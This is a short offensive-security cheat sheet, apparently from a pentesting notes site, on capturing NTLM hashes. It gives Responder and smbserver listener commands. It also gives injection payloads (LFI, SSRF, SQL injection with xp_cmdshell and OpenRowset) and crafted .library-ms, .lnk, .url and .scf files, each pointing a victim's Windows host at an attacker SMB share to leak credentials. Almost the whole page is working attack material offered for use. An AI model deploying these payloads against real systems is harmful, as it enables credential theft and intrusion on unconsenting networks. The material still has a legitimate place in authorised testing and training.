---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Capturing NTLM

## Listener

```sh
sudo responder -I $INTERFACE -A
```

```sh
smbserver.py share /dev/null -smb2support
```

## Possible Attacks

### Via web vulnerability

If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:

```sh
# LFI
?page=\\$IP\shared

# SSRF
?url=file:////$IP/shared

# SQL Injection
?id=1' union select null,load_file('\\\\$IP\\shared'),null-- -
?id=1' union select null,(select x from OpenRowset(BULK '\\$IP\shared',SINGLE_CLOB) R(x)),null-- -
?id=1' union select null,(EXEC xp_cmdshell 'dir \\$IP\shared'),null-- -
```

### Via .library-ms file

```sh
cat > '!shared.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\$IP\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

### Via .lnk file

```sh
pylnk3 c "\\\\$IP\shared" '!shared.lnk' -i "\\\\$IP\\shared\\icon.ico"
```

### Via .url file

```sh
cat > '!shared.url' <<'EOF'
[InternetShortcut]
URL=\\\\$IP\\shared
IconIndex=1
IconFile=\\\\$IP\\shared\\icon.ico
EOF
```

### Via .scf file

```sh
cat > '!shared.scf' <<'EOF'
[Shell]
Command=2
IconFile=\\\\$IP\\shared\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
```
